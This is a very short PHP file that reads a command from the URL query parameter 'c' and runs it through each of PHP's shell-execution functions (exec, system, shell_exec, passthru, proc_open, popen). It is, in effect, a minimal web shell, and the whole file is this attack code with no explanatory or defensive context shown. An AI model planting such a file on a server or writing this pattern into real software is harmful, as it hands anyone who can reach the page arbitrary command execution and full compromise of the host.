<?php
$cmd = $_GET["c"];
exec($cmd);
system($cmd);
shell_exec($cmd);
passthru($cmd);
proc_open($cmd, [], $p);
popen($cmd, "r");
